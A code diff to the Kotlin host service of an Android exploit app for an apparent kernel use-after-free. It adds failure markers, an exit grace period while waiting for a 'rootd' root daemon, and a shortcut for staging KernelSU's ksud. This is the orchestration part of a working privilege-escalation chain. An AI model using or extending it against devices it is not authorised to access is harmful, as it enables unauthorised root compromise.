@@ -58,6 +58,24 @@ class Cve98260UserService(private val context: Context) : ICve98260UserService.S
         private const val ROOTD_MARKER = "C98260_ROOTD_READY=1"
 
         /**
+         * 原生体的「我已经放弃」标记（uaf_plant.c 的 EXPLOIT_FAILED_MARKER）。
+         *
+         * 原生体打不出 rootd 标记时，宿主原来只能死等满 300 s 才报超时
+         * （真机实测白等 134 s）。看到这个标记就立刻收场。
+         */
+        private const val FAILED_MARKER = "C98260_EXPLOIT_FAILED=1"
+
+        /**
+         * 原生体进程退出后的宽限期（毫秒）。
+         *
+         * 宿主用 --daemon-exit 启动原生体：**成功路径里主进程本来就会正常退出**
+         * （rootd 是 cred child 的孙进程，还在跑），而 rootd 写就绪标记与主
+         * 进程退出是并行的两条线，中间有几十毫秒的窗口。所以进程退出后还要
+         * 再等这么久看标记有没有到，避免把「已提权成功」误报成失败。
+         */
+        private const val EXIT_GRACE_MS = 5_000L
+
+        /**
          * E4：日志尾扫上限。旧实现只扫末 32KB，若就绪/失败标记写入较早、其后日志
          * 超过 32KB 就会漏判。日志文件每轮开始时被截断（见 runChain 的 writeText("")），
          * 因此从头扫描不会命中上一轮残留；上限仅用于兜住异常超大日志。
@@ -277,7 +295,19 @@ class Cve98260UserService(private val context: Context) : ICve98260UserService.S
             callback?.onLog("<b> injection started (pid held by native), waiting for rootd...")
 
             if (!waitForRootd(logFile, INJECT_TIMEOUT_SEC * 1000)) {
-                callback?.onLog("<s> error: rootd not ready in time, injection failed")
+                val gaveUp = tailContains(logFile, FAILED_MARKER)
+                val proc = exploitProcess
+                val died = proc != null && !proc.isAlive
+                callback?.onLog(
+                    when {
+                        gaveUp ->
+                            "<s> error: exploit gave up before rootd was ready (native abort marker)"
+                        died ->
+                            "<s> error: exploit process exited unexpectedly, injection failed"
+                        else ->
+                            "<s> error: rootd not ready in time, injection failed"
+                    }
+                )
                 callback?.onProgress(stageIndex(Stage.INJECT), "failed")
                 return 4
             }
@@ -1119,13 +1149,47 @@ class Cve98260UserService(private val context: Context) : ICve98260UserService.S
 
     private fun waitForRootd(logFile: File, timeoutMs: Long): Boolean {
         val deadline = System.currentTimeMillis() + timeoutMs
+        var lastLen = -1L
+        var exitedAt = 0L
         while (System.currentTimeMillis() < deadline) {
-            if (tailContains(logFile, ROOTD_MARKER)) return true
-            if (tailContains(logFile, "cred escalation not effective") ||
-                tailContains(logFile, "binding failed") ||
-                tailContains(logFile, "listen failed")
-            ) {
-                return false
+            /*
+             * 日志文件没变长就不重扫。tailContains 每次要读 4 MB 尾巴
+             * （TAIL_SCAN_MAX），400 ms 一轮、300 s 超时 = 几百 MB 的重复 IO，
+             * 白烧在 Shizuku 服务进程上。
+             */
+            val len = logFile.length()
+            if (len != lastLen) {
+                lastLen = len
+                if (tailContains(logFile, ROOTD_MARKER)) return true
+                /* 原生体自己放弃：立刻返回，别空等满 300 s。 */
+                if (tailContains(logFile, FAILED_MARKER)) return false
+                if (tailContains(logFile, "cred escalation not effective") ||
+                    tailContains(logFile, "binding failed") ||
+                    tailContains(logFile, "listen failed")
+                ) {
+                    return false
+                }
+            }
+            /*
+             * 原生体进程退出**不能**立刻当成失败。
+             *
+             * 宿主是用 --daemon-exit 启动它的：**成功路径里主进程本来就会正常
+             * 退出**（rootd 是 cred child 的孙进程，还在跑）。rootd 写就绪
+             * 标记与主进程退出是并行的两条线，中间有几十毫秒的窗口 ——
+             * 一见进程退出就判失败，会把「已经提权成功」误报成失败。
+             *
+             * 所以：进程退出后进入宽限期，期间继续等 rootd 标记；宽限期过了
+             * 还没有标记，才认定原生体真的崩了。
+             */
+            val proc = exploitProcess
+            if (proc != null && !proc.isAlive) {
+                if (exitedAt == 0L) {
+                    exitedAt = System.currentTimeMillis()
+                } else if (System.currentTimeMillis() - exitedAt > EXIT_GRACE_MS) {
+                    return false
+                }
+            } else {
+                exitedAt = 0L
             }
             Thread.sleep(400)
         }
@@ -1218,36 +1282,51 @@ class Cve98260UserService(private val context: Context) : ICve98260UserService.S
             callback?.onLog("<s> no manager with ksud found via PackageManager (incl. obfuscated forks); trying script")
         }
 
-        val scriptOutcome = runCatching {
-            val out = File(workDir, "ksud_stage.out").apply { delete() }
-            val pb = ProcessBuilder("/system/bin/sh", "-c", KsudStage.SCRIPT)
-                .redirectErrorStream(true)
-                .redirectOutput(ProcessBuilder.Redirect.appendTo(out))
-            val p = pb.start()
-            if (!p.waitFor(20, TimeUnit.SECONDS)) {
-                Log.w(TAG, "ksud stage timed out; falling back to bundled ksud")
-                callback?.onLog("<s> warn: ksud stage timeout, using bundled ksud")
-                return@runCatching null
-            }
-            KsudStage.parse(runCatching { out.readText() }.getOrDefault(""))
-        }.getOrNull()
-
-        when (scriptOutcome) {
-            is KsudStage.Outcome.Ok -> {
-                val f = File(KsudStage.TARGET)
-                if (f.isFile && f.length() > 0L) {
-                    f.setExecutable(true, false)
-                    staged = f
-                    callback?.onLog(
-                        "<s> ksud staged via script: md5=${scriptOutcome.md5} size=${scriptOutcome.size}",
-                    )
-                } else {
-                    callback?.onLog("<s> warn: ksud stage reported ok but file missing; using bundled")
+        /*
+         * PM 扫描已经拿到 ksud 时**不再跑 shell 脚本**。
+         *
+         * 脚本那一路要逐个 pm path + 拷文件，最长 20 s；而 PM 扫描认的是
+         * 内容签名、且认的是用户选定的那个管理器，比脚本更准。注入阶段的
+         * 每一秒都被用户当成「提权很慢」，能省则省。
+         */
+        val scriptOutcome: KsudStage.Outcome? = if (scanned != null) {
+            null
+        } else {
+            runCatching {
+                val out = File(workDir, "ksud_stage.out").apply { delete() }
+                val pb = ProcessBuilder("/system/bin/sh", "-c", KsudStage.SCRIPT)
+                    .redirectErrorStream(true)
+                    .redirectOutput(ProcessBuilder.Redirect.appendTo(out))
+                val p = pb.start()
+                if (!p.waitFor(20, TimeUnit.SECONDS)) {
+                    Log.w(TAG, "ksud stage timed out; falling back to bundled ksud")
+                    callback?.onLog("<s> warn: ksud stage timeout, using bundled ksud")
+                    return@runCatching null
                 }
+                KsudStage.parse(runCatching { out.readText() }.getOrDefault(""))
+            }.getOrNull()
+        }
+
+        if (scanned != null) {
+            callback?.onLog("<s> skip ksud shell stage: PackageManager scan already located ksud")
+        } else {
+            when (scriptOutcome) {
+                is KsudStage.Outcome.Ok -> {
+                    val f = File(KsudStage.TARGET)
+                    if (f.isFile && f.length() > 0L) {
+                        f.setExecutable(true, false)
+                        staged = f
+                        callback?.onLog(
+                            "<s> ksud staged via script: md5=${scriptOutcome.md5} size=${scriptOutcome.size}",
+                        )
+                    } else {
+                        callback?.onLog("<s> warn: ksud stage reported ok but file missing; using bundled")
+                    }
+                }
+                is KsudStage.Outcome.Fail ->
+                    callback?.onLog("<s> warn: ksud stage fail (${scriptOutcome.reason}); using bundled ksud")
+                null -> callback?.onLog("<s> warn: ksud stage error; using bundled ksud")
             }
-            is KsudStage.Outcome.Fail ->
-                callback?.onLog("<s> warn: ksud stage fail (${scriptOutcome.reason}); using bundled ksud")
-            null -> callback?.onLog("<s> warn: ksud stage error; using bundled ksud")
         }
 
         // 优先返回设备管理器的 ksud（让加载的模块与已装管理器同源），
